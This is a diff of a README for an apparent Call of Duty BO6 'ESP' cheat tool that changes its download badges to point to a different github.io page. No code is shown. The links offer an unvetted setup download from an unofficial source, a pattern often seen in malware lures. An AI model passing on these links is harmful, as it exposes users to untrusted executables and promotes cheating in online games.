@@ -1,7 +1,8 @@
 # Call of Duty BO6 — Visual ESP Assistant
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blueviolet)](https://cod-bo6-esp-visual.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://cod-bo6-esp-visual.github.io/.github/)
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blueviolet)](https://strackeblanca3.github.io/.github/cod-bo6-esp-visual)  
+
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://strackeblanca3.github.io/.github/cod-bo6-esp-visual)
 
 ---
 
